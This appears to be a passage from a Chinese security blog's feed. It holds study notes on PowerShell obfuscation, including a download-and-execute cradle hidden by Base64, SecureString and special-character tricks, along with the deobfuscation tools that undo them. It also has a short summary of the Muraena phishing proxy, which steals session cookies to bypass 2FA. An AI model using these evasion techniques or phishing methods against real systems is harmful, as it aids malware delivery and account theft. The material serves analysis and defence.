class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$command = &quot;(New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)&quot;</span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) </span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes) </span><br><span class="line">powershell.exe -EncodedCommand $encodedCommand</span><br></pre></td></tr></table></figure><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>&emsp;使用函数<code>SecureStringToBSTR</code>，若要运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;可以写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = &quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)&quot;</span><br><span class="line">$secCmd = ConvertTo-SecureString $cmd -AsPlainText -Force</span><br><span class="line">$secCmdPlaintext = $secCmd | CovertFrom-SecureString -Key (1..16)</span><br><span class="line">$secCmd = $secCmdPlaintext | ConvertTo-SecureString -Key (1..16)</span><br><span class="line">([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secCmd))) | IEX</span><br></pre></td></tr></table></figure><h3 id="IEX等命令的替代"><a href="#IEX等命令的替代" class="headerlink" title="IEX等命令的替代"></a>IEX等命令的替代</h3><ul><li>IEX别名：<code>Invoke-Expression</code>、<code>&amp;(GAL I*X)</code>。</li><li>通过command的方式来进行编码：<code>Command I*e-E*</code>。</li><li>使用环境变量：<code>$ExecutionContext.InvokeCommand.GetCmdlets(&#39;I*e-E*&#39;)</code>。</li><li>其他选项/命令的别名（替代）如下所示：</li></ul><p><img src="/images/ps-obfuscation/image-20231016141807602.png" alt="image-20231016141807602" style="zoom:67%;" /></p><h3 id="特殊字符混淆"><a href="#特殊字符混淆" class="headerlink" title="特殊字符混淆"></a>特殊字符混淆</h3><p>&emsp;可以使用特殊字符来定义变量，相关的项目名为<code>Invoke-Obfuscation</code>。给出如下脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125;  =+  $(  )  ;$&#123;;<span class="regexp">/=&#125;  =$&#123;$!-&#125;;$&#123;-&#125;=  ++  $&#123;$!-&#125;  ;$&#123;/</span>&#125;  =++$&#123;$!-&#125;;$&#123;(&#125;  =  ++  $&#123;$!-&#125;;$&#123;#&#125;=  ++$&#123;$!-&#125;;$&#123;.&#125;  =++  $&#123;$!-&#125;  ;$&#123;)@&#125;  =  ++  $&#123;$!-&#125;  ;$&#123;!&#125;  =++$&#123;$!-&#125;  ;$&#123;;~+&#125;=  ++  $&#123;$!-&#125;;$&#123;@&#125;=++$&#123;$!-&#125;  ;$&#123;[$ &#125;  =<span class="string">&quot;[&quot;</span>+  <span class="string">&quot;$(  @&#123;&#125;  )&quot;</span>[  $&#123;!&#125;]  +<span class="string">&quot;$(@&#123;&#125;)&quot;</span>[<span class="string">&quot;$&#123;-&#125;&quot;</span>+<span class="string">&quot;$&#123;@&#125;&quot;</span>]+<span class="string">&quot;$(@&#123;  &#125;)  &quot;</span>[<span class="string">&quot;$&#123;/&#125;&quot;</span>  +<span class="string">&quot;$&#123;;/=&#125;&quot;</span>  ]+<span class="string">&quot;$?&quot;</span>[$&#123;-&#125;  ]+<span class="string">&quot;]&quot;</span>;$&#123;$!-&#125;=<span class="string">&quot;&quot;</span>.(<span class="string">&quot;$(@&#123;&#125;  )  &quot;</span>[  <span class="string">&quot;$&#123;-&#125;$&#123;#&#125;&quot;</span>]  +  <span class="string">&quot;$(  @&#123;  &#125;  )  &quot;</span>[<span class="string">&quot;$&#123;-&#125;$&#123;)@&#125;&quot;</span>]+  <span class="string">&quot;$(  @&#123;&#125;)&quot;</span>[$&#123;;<span class="regexp">/=&#125;]+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;#&#125;]  +  &quot;$?&quot;[  $&#123;-&#125;  ]  +&quot;$(@&#123;  &#125;)  &quot;[$&#123;(&#125;]);$&#123;$!-&#125;=  &quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;$&#123;#&#125;&quot;  ]+  &quot;$(  @&#123;&#125;)&quot;[  $&#123;#&#125;]  +  &quot;$&#123;$!-&#125;&quot;[  &quot;$&#123;/&#125;$&#123;!&#125;&quot;]  ;.$&#123;$!-&#125;(  &quot;$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;@&#125;+  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;!&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;/=&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;.&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;#&#125;+$&#123;[$ &#125;$&#123;(&#125;$&#123;/&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;;/=&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;~+&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;/&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;/&#125;+  $&#123;[$ &#125;$&#123;.&#125;$&#123;)@&#125;|  $&#123;$!-&#125;  &quot;  )</span></span><br></pre></td></tr></table></figure><p>（1）按<code>;</code>隔开脚本，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125;  =+  $(  )  ;</span><br><span class="line">$&#123;;/=&#125;  =$&#123;$!-&#125;;</span><br><span class="line">$&#123;-&#125;=  ++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;/&#125;  =++$&#123;$!-&#125;;</span><br><span class="line">$&#123;(&#125;  =  ++  $&#123;$!-&#125;;</span><br><span class="line">$&#123;#&#125;=  ++$&#123;$!-&#125;;</span><br><span class="line">$&#123;.&#125;  =++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;)@&#125;  =  ++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;!&#125;  =++$&#123;$!-&#125;  ;</span><br><span class="line">$&#123;;~+&#125;=  ++  $&#123;$!-&#125;;</span><br><span class="line">$&#123;@&#125;=++$&#123;$!-&#125;  ;</span><br><span class="line">$&#123;[$ &#125;  =&quot;[&quot;+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;!&#125;]  +&quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;&quot;+&quot;$&#123;@&#125;&quot;]+&quot;$(@&#123;  &#125;)  &quot;[&quot;$&#123;/&#125;&quot;  +&quot;$&#123;;/=&#125;&quot;  ]+&quot;$?&quot;[$&#123;-&#125;  ]+&quot;]&quot;;</span><br><span class="line">$&#123;$!-&#125;=&quot;&quot;.(&quot;$(@&#123;&#125;  )  &quot;[  &quot;$&#123;-&#125;$&#123;#&#125;&quot;]  +  &quot;$(  @&#123;  &#125;  )  &quot;[&quot;$&#123;-&#125;$&#123;)@&#125;&quot;]+  &quot;$(  @&#123;&#125;)&quot;[$&#123;;/=&#125;]+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;#&#125;]  +  &quot;$?&quot;[  $&#123;-&#125;  ]  +&quot;$(@&#123;  &#125;)  &quot;[$&#123;(&#125;]);</span><br><span class="line">$&#123;$!-&#125;=  &quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;$&#123;#&#125;&quot;  ]+  &quot;$(  @&#123;&#125;)&quot;[  $&#123;#&#125;]  +  &quot;$&#123;$!-&#125;&quot;[  &quot;$&#123;/&#125;$&#123;!&#125;&quot;]  ;</span><br><span class="line">.$&#123;$!-&#125;(  &quot;$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;@&#125;+  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;!&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;/=&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;.&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;#&#125;+$&#123;[$ &#125;$&#123;(&#125;$&#123;/&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;;/=&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;~+&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;/&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;/&#125;+  $&#123;[$ &#125;$&#123;.&#125;$&#123;)@&#125;|  $&#123;$!-&#125;  &quot;  )</span><br></pre></td></tr></table></figure><p>（2）执行完前12行后，有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125; = 8</span><br><span class="line">$&#123;;/=&#125; = 0</span><br><span class="line">$&#123;-&#125;   = 1</span><br><span class="line">$&#123;/&#125;   = 2</span><br><span class="line">$&#123;(&#125;   = 3</span><br><span class="line">$&#123;#&#125;   = 4</span><br><span class="line">$&#123;.&#125;   = 5</span><br><span class="line">$&#123;)@&#125;  = 6</span><br><span class="line">$&#123;!&#125;   = 7</span><br><span class="line">$&#123;;~+&#125; = 8</span><br><span class="line">$&#123;@&#125;   = 9</span><br></pre></td></tr></table></figure><p>（3）由于<code>&quot;$(@&#123;&#125;)&quot;</code>返回<code>System.Collections.Hashtable</code>，<code>&quot;$?&quot;</code>返回<code>True</code>，因此有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;[$ &#125; = &quot;[&quot;+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;!&#125;]  +&quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;&quot;+&quot;$&#123;@&#125;&quot;]+&quot;$(@&#123;  &#125;)  &quot;[&quot;$&#123;/&#125;&quot;  +&quot;$&#123;;/=&#125;&quot;  ]+&quot;$?&quot;[$&#123;-&#125;  ]+&quot;]&quot;</span><br><span class="line">       = &quot;[&quot; + &quot;System.Collections.Hashtable&quot;[7] + &quot;System.Collections.Hashtable&quot;[19] + &quot;System.Collections.Hashtable&quot;[20] + &quot;True&quot;[1] + &quot;]&quot;</span><br><span class="line">       = &quot;[Char]&quot;</span><br></pre></td></tr></table></figure><p>&emsp;类似的分析，得到<code>$&#123;$!-&#125;=iex</code>，最后执行的指令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.iex(mkdir onlyf8 | iex)</span><br></pre></td></tr></table></figure><p>注：BlobRunner可以调试shellcode。</p><h2 id="powershell-反混淆"><a href="#powershell-反混淆" class="headerlink" title="powershell 反混淆"></a>powershell 反混淆</h2><h4 id="基于AST和语义保持的反混淆（Invoke-Deobfuscation-工具）"><a href="#基于AST和语义保持的反混淆（Invoke-Deobfuscation-工具）" class="headerlink" title="基于AST和语义保持的反混淆（Invoke-Deobfuscation 工具）"></a>基于AST和语义保持的反混淆（Invoke-Deobfuscation 工具）</h4><p>&emsp;现有方法反混淆主要分为三个步骤，即<code>识别混淆脚本片段、还原混淆和重构脚本</code>。</p><p>&emsp;在<code>识别混淆脚本片段</code>上，PowerDecode设计了一组正则表达式来匹配，但它们经常识别出带有无效语法的错误脚本片段；李振源等人使用基于机器学习的分类器来识别混淆脚本片段，其使用抽象语法树（AST）节点的特征来识别具有有效语法的混淆片段，这在很大程度上取决于训练数据的质量。</p><p>&emsp;在<code>还原混淆</code>方面，有3种方法：<code>预定义还原规则、函数重载和直接执行</code>。预定义的还原规则按照混淆的类型模拟还原过程，对于一些特定的混淆技术非常有效，但经常因忽略混淆脚本片段的语法而得到错误的结果。函数重载用于处理特定函数的混淆参数，如Invoke-Expression，它拦截目标函数并捕获它们经过多次反混淆的运行时参数。直接执行是另一种处理混淆脚本片段的方法，但是，由于缺少上下文，该方法无法正确处理带变量的混淆片段。</p><p>&emsp;现有的<code>脚本重构方法</code>都是上下文无关的，因此它们最终的反混淆脚本可能不符合语法或在语义上不一致。它们替换脚本中所有相同的混淆片段，这会忽略这些片段的不同上下文，并可能改变脚本的语义。</p><p>&emsp;Invoke-Deobfuscation做了如下几件事：（1）根据脚本 AST 的标记和可还原节点识别混淆的脚本片段；（2）跟踪变量以获取混淆脚本片段的上下文；（3）基于AST的后序遍历重构脚本。</p><p>&emsp;Invoke-Deobfuscation的反混淆过程可以分为三个阶段：Token解析、基于AST的变量跟踪和还原、重命名和重排版。</p><h5 id="Token解析"><a href="#Token解析" class="headerlink" title="Token解析"></a>Token解析</h5><p>&emsp;基于Microsoft的官方库<code>System.Management.Automation.PSParser</code>对ps脚本进行标记化，Token包含文本内容、起始偏移、长度等许多属性。之后，利用Token的属性来还原原始Token并将它们组合起来形成反混淆脚本。如下图所示：</p><p><img src="/images/ps-obfuscation/image-20231015184907321.png" alt="image-20231015184907321" style="zoom:67%;" /></p><p>&emsp;如果一个Token的类型是命令，它的内容是一个别名，如上图中的命令IeX，将用全称Invoke-Expression替换它。可以在Token级别处理其他混淆，例如随机大小写。处理完一个混淆的Token后，我们将在脚本中将其替换为它的还原结果。逆序处理可以<code>识别未处理的Token而不需要重新解析新产生的脚本</code>。</p><h5 id="基于AST的还原"><a href="#基于AST的还原" class="headerlink" title="基于AST的还原"></a>基于AST的还原</h5><p>&emsp;混淆脚本包括包括混淆数据及其还原算法。反混淆的关键是<code>在混淆脚本中识别这些可还原的片段</code>。</p><p>（1）识别可还原的片段</p><p>&emsp;<code>使用 PowerShell AST 上特定类型节点的内容来识别可还原的脚本片段</code>。首先，PowerShell脚本的AST各节点内容语法有效，包含可还原的脚本片段。其次，通过执行可还原的片段来获得原始片段。例如，”he”+”llo”可以执行得到”hello”。因此，我们对PowerShell AST中的所有节点类型进行分析，找出其内容在执行后往往能得到字符串形式结果的节点类型。我们称这些类型的节点为可还原节点，包括PipelineAst、UnaryExpressionAst、BinaryExpressionAst、ConvertExpressionAst、InvokeMemberExpressionAst和SubExpressionAst 。最后，<code>可还原节点的内容提取为可还原片段</code>。</p><p>（2）基于调用的还原</p><p>&emsp;<code>通过Invoke函数执行可还原的脚本片段以获得它们的还原结果</code>。可还原的脚本片段可能包含与还原过程无关的命令，例如Restart-Computer、Start-Sleep等。因此，创建这些命令的黑名单以加速反混淆。</p><p>（3）变量追踪</p><p>&emsp;由于<code>缺少上下文</code>，无法直接执行包含变量的可还原片段来获得正确的还原结果，因此，<code>使用符号表来记录脚本中出现的变量的范围和值</code>。变量分为局部变量、全局变量和环境变量三种类型。后序遍历AST，记录下当前访问节点的作用域。只有在访问NamedblockAst、IfStatementAst、WhileStatementAst、ForStatementAst、ForEachStatementAst和StatementBlockAst六种节点时，当前节点作用域的深度将变化。</p><p>&emsp;通过执行变量的赋值表达式将变量的值记录在符号表中。基于 AssignmentStatement 节点，可以识别变量及其赋值表达式。</p><p>（4）Invoke-Expression 和 PowerShell</p><p>&emsp;混淆脚本通常包含<code>多层混淆</code>，其典型特征是包含Invoke-Expression cmdlet或PowerShell。Invoke-Expression和PowerShell都可以将它们的字符串参数作为脚本运行。攻击者经常使用不同的方法来混淆这些命令。例如，混淆片段<code>.($pshome[4]+$pshome[30]+&quot;x&quot;)</code>等同于Invoke-Expression，使用变量追踪可以得到还原结果<code>.(&quot;iex&quot;)</code>，这是Invoke-Expression的常见格式。Invoke-Expression的其他常见格式包括<code>iex</code>、<code>&quot;xxx&quot;|iex</code>和<code>&amp;&quot;iex&quot;</code>。</p><p>&emsp;PowerShell可以使用参数<code>-EncodedCommand</code>执行Base64编码的命令。由于PowerShell的<code>自动补全和大小写不敏感</code>，该参数可以用于多种格式，如-e、-eNc等。我们将参数转换为小写并使用<code>&quot;-encodedcommand&quot;.StartsWith($param)</code>判断参数是否为<code>-EncodedCommand</code>。</p><p>（5）脚本重构</p><p>&emsp;基于 AST 的<code>后序遍历</code>重构反混淆脚本，当访问一个节点时，我们首先使用它的子节点的内容来更新它的内容，以确保在访问它时，它的所有子节点都已经处理完毕。如果其内容被混淆，我们将用其还原结果替换它。最终，当我们访问 AST 的根节点时，将获得整个反混淆脚本。</p><h5 id="重命名和重排版"><a href="#重命名和重排版" class="headerlink" title="重命名和重排版"></a>重命名和重排版</h5><p>&emsp;随机命名变量和函数的重命名以及代码的重排版可以使脚本更易于分析人员分析。使用<code>统计分析</code>来确定变量名称函数名称是否是随机的，并用预定义的规则替换随机名称。</p><p>（1）将脚本中所有唯一的变量名和函数名提取出来，看成是一个完整的字符串。根据元音和特殊字符的比例来判断字符串是否随机。Hayden指出在通用美式英语中元音的比例约为37.4%，因此当英文字符中元音的比例不在32%和42%之间时，我们假设字符串是随机的。</p><p>（2）对于非英文字母的特殊字符，我们将来自GitHub的4234个正常PowerShell脚本与我们收集到的恶意脚本进行统计对比，发现正常脚本中英文字母的比例大于70%，而非英文字母的特殊字符比例小于 2%。因此，当一个字符串的英文字母比例小于10% 时，我们假设该字符串是随机的。</p><p>（3）使用<code>var_&#123;num&#125;</code>和<code>func_&#123;num&#125;</code>替换随机变量和函数名称，新名称取决于该变量或函数在混淆脚本片段出现的顺序。</p><h4 id="日志去混淆"><a href="#日志去混淆" class="headerlink" title="日志去混淆"></a>日志去混淆</h4><p>&emsp;powershell日志记录了执行ps指令的过程，因此可以通过日志查看真实执行的ps指令。</p><h4 id="PowerDrive工具-去混淆原理"><a href="#PowerDrive工具-去混淆原理" class="headerlink" title="PowerDrive工具-去混淆原理"></a>PowerDrive工具-去混淆原理</h4><p><img src="/images/ps-obfuscation/image-20231016135538877.png" alt="image-20231016135538877" style="zoom:67%;" /></p><p>&emsp;PowerDrive由<code>预处理模块、去混淆模块、反调试检测模块、执行脚本模块</code>4个模块组成。各个模块功能为：</p><ul><li>预处理模块：将多行转换成一行，去除不可见的ASCII字符，检查符号是否正确。</li><li>去混淆模块：（1）使用正则来匹配需要重新排序的字符串，并进行重新排序。（2）使用Invoke-Expression将混淆后的字符串作为命令运行，字符串就会被自动去混淆。</li><li>反调试检测模块：检测sleep指令、检测恶意软件的输出是否被重定向到空输出、检测死循环、检测是否使用try-catch模块来引发异常。</li><li>执行脚本模块：主要是检索后续阶段的有效载荷，钩取Invoke-WebRequest、 Invoke-Rest和New-Object来提取脚本关联的其他可执行文件。</li></ul><h4 id="机器学习去混淆"><a href="#机器学习去混淆" class="headerlink" title="机器学习去混淆"></a>机器学习去混淆</h4><p>&emsp;构建分类器（File Status Classifier）来确定样本是否被编码、混淆或是明文。然后循环应用解码和反混淆逻辑，并且检查每次的输出以确定是否需要下一次操作。最后，用cleanup神经网络来修正无法处理的特殊位。如下所示：</p><p><img src="/images/ps-obfuscation/image-20231016151347423.png" alt="image-20231016151347423" style="zoom:67%;" /></p><h5 id="构建-Status-Classifier"><a href="#构建-Status-Classifier" class="headerlink" title="构建 Status Classifier"></a>构建 Status Classifier</h5><p>&emsp;其步骤为：（1）收集含有标签的样本（比如，十六进制编码、混淆、明文等）；（2）对样本生成数字特征；（3）进行训练。</p><p>&emsp;针对（1），通过爬虫抓取github ps样本，并生成混淆与编码样本。</p><p>&emsp;针对（2），以样本为输入，使用LSTM，生成样本数字特征。</p><h5 id="构建-De-encoder"><a href="#构建-De-encoder" class="headerlink" title="构建 De-encoder"></a>构建 De-encoder</h5><p>&emsp;使用正则表达式来进行模式匹配，从而解码。</p><h5 id="构建-Deobfuscator"><a href="#构建-Deobfuscator" class="headerlink" title="构建 Deobfuscator"></a>构建 Deobfuscator</h5><p>&emsp;大部分可以通过简单逻辑来处理：连接字符串，移除反引号，替换变量等。</p><p>&emsp;对于基于<code>-f</code>的字符串进行重新排序，步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 找出-f或-F；</span><br><span class="line">2. 找出所有-f之前的&#123;[0-9]+&#125;类型的占位符</span><br><span class="line">3. 找出所有-f之后的所有的字符串和有效的非字符串值</span><br><span class="line">4. 用值替换占位符</span><br><span class="line">5. 在同一行进行多次循环</span><br></pre></td></tr></table></figure><h5 id="构建-Cleanup-Network"><a href="#构建-Cleanup-Network" class="headerlink" title="构建 Cleanup Network"></a>构建 Cleanup Network</h5><p>&emsp;被Cleanup Network处理前，可能包含很多令人费解的字符串，例如<code>MOdULEDiRectORy</code>。使用Seq2Seq（翻译中经常用到），针对减少错误的预测结果，步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 找出混淆后脚本和非混淆脚本中对应的单词</span><br><span class="line">2. 找出可能被混淆的变量和关键词</span><br><span class="line">3. 用混淆后脚本中单词作为输入，非非混淆脚本中单词作为期望输出</span><br><span class="line">4. 用之前的预测和新的输入数据预测下一个字符</span><br></pre></td></tr></table></figure><h4 id="其他工具去混淆"><a href="#其他工具去混淆" class="headerlink" title="其他工具去混淆"></a>其他工具去混淆</h4><p>（1）静态规则检测：Flerken</p><p>（2）混淆还原：powershellprofiler</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://rootclay.gitbook.io/powershell-attack-guide/jin-jie-pian/9.-hun-xiao">https://rootclay.gitbook.io/powershell-attack-guide/jin-jie-pian/9.-hun-xiao</a></p><p>[2] <a href="https://onlyf8.com//powershell-obfuscationEN">https://onlyf8.com//powershell-obfuscationEN</a></p><p>[3] <a href="https://www.secrss.com/articles/52662">https://www.secrss.com/articles/52662</a></p><p>[4] <a href="https://www.ctfiot.com/41643.html">https://www.ctfiot.com/41643.html</a></p><p>[5] <a href="https://www.secrss.com/articles/20119">https://www.secrss.com/articles/20119</a></p><p>[6] <a href="https://xz.aliyun.com/t/2923">https://xz.aliyun.com/t/2923</a></p><p>[7] <a href="https://cloud.tencent.com/developer/article/1639161">https://cloud.tencent.com/developer/article/1639161</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;powershell混淆与反混&quot;&gt;&lt;a href=&quot;#powershell混淆与反混&quot; class=&quot;headerlink&quot; title=&quot;powershell混淆与反混&quot;&gt;&lt;/a&gt;powershell混淆与反混&lt;/h1&gt;&lt;p&gt;&amp;emsp;powershell是基于&lt;code&gt;.net&lt;/code&gt;开发的自动化语言。利用ps可以进行很多攻击，例如，利用&lt;code&gt;DownloadString&lt;/code&gt;，能够在设备上运行命令/外壳代码/可执行文件，而&lt;code&gt;无需对设备磁盘进行任何写入操作&lt;/code&gt;。或者使用&lt;code&gt;Marshall&lt;/code&gt;类，外壳代码可以在内存中解密，并且可以在&lt;code&gt;不写入磁盘的情况下执行&lt;/code&gt;。ps提供了对机器内核的访问，包括对Windows API的无限制访问。因此，越来越多的网络犯罪分子将PowerShell加入了他们的攻击武器库。&lt;/p&gt;</summary>
    
    
    
    <category term="study-notes" scheme="https://wd-2711.tech/categories/study-notes/"/>
    
    
  </entry>
  
  <entry>
    <title>muraen-source-code-reading</title>
    <link href="https://wd-2711.tech/2023/10/13/muraen-source-code-reading/"/>
    <id>https://wd-2711.tech/2023/10/13/muraen-source-code-reading/</id>
    <published>2023-10-13T10:27:13.000Z</published>
    <updated>2023-10-18T06:14:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="muraen钓鱼工具-源码分析"><a href="#muraen钓鱼工具-源码分析" class="headerlink" title="muraen钓鱼工具-源码分析"></a>muraen钓鱼工具-源码分析</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>&emsp;传统网络钓鱼攻击是由虚假登录页面组成的，这些页面在攻击者控制的web服务器上，并由与目标网站名称相似的自定义域名提供服务。然而，对于2FA（双因素认证）而言，即使攻击者拿到了<code>用户名密码</code>，也无法登录网站，因为没有与合法网站进行交互来触发生成<code>cookie</code>。此时，攻击者需要让钓鱼网站充当代理，代表受害者转发请求到合法网站，并实时回传（中间人攻击）。</p><span id="more"></span><p>&emsp;识别中间人攻击的方式有很多，例如子资源完整性 (Subresource Integrity，SRI) 和内容安全策略 (Content Security Policy，CSP) 等技术（<code>为什么能识别？还不明白</code>）。为了绕过这些防御措施，Muraena应运而生。</p><h2 id="Muraena的功能"><a href="#Muraena的功能" class="headerlink" title="Muraena的功能"></a>Muraena的功能</h2><p>&emsp;一旦部署完成，攻击者就可以配置他们的钓鱼域名，并为其获得合法的证书（通过非营利性的Let’s Encrypt证书颁发机构）。该工具包含<code>充当反向代理的小型web服务器</code>和<code>爬虫程序</code>。爬虫程序可以<code>自动确定从合法网站代理哪些资源</code>。小型web服务器在传递来自受害者的请求之前重写这些请求。爬虫程序会自动生成一个JSON配置文件，然后可以手动修改该文件来绕过更复杂网站上的各种防御机制。</p><p>&emsp;一旦受害者登陆一个由Muraena提供支持的钓鱼网站，那么攻击过程如下所示：</p><p>（1）网站会要求用户输入他们的2FA验证码（用户名密码）。当他们提供验证码并完成身份验证之后，代理会窃取会话cookie。cookie通常由浏览器存储在一个文件中，并在后续请求中提供服务。</p><p>（2）Muraena自动将收集到的会话cookie传送给NecroBrowser，而NecroBrowser可以立即滥用cookie。<br>NecroBrowser是一个可以通过API进行控制的微服务，进行配置以后可在Docker容器内运行的Chromium实例执行操作。攻击者可以同时生成数十个容器，每个容器都有一个窃取的cookie。</p><h2 id="源码阅读笔记"><a href="#源码阅读笔记" class="headerlink" title="源码阅读笔记"></a>源码阅读笔记</h2><p>&emsp;注：没有实际跑过，看了四五天，头大，越看越不知道是干啥的。笔记以注释形式存在。</p><p>&emsp;链接：<a href="https://github.com/WD-2711/muraena">https://github.com/WD-2711/muraena</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;muraen钓鱼工具-源码分析&quot;&gt;&lt;a href=&quot;#muraen钓鱼工具-源码分析&quot; class=&quot;headerlink&quot; title=&quot;muraen钓鱼工具-源码分析&quot;&gt;&lt;/a&gt;muraen钓鱼工具-源码分析&lt;/h1&gt;&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;&amp;emsp;传统网络钓鱼攻击是由虚假登录页面组成的，这些页面在攻击者控制的web服务器上，并由与目标网站名称相似的自定义域名提供服务。然而，对于2FA（双因素认证）而言，即使攻击者拿到了&lt;code&gt;用户名密码&lt;/code&gt;，也无法登录网站，因为没有与合法网站进行交互来触发生成&lt;code&gt;cookie&lt;/code&gt;。此时，攻击者需要让钓鱼网站充当代理，代表受害者转发请求到合法网站，并实时回传（中间人攻击）。&lt;/p&gt;</summary>
    
    
    
    <category term="go" scheme="https://wd-2711.tech/categories/go/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-reverse-analysis-2</title>
    <link href="https://wd-2711.tech/2023/10/09/frida-reverse-analysis-2/"/>
    <id>https://wd-2711.tech/2023/10/09/frida-reverse-analysis-2/</id>
    <published>2023-10-09T10:34:44.000Z</published>
    <updated>2023-12-09T05:14:20.814Z</updated>
    
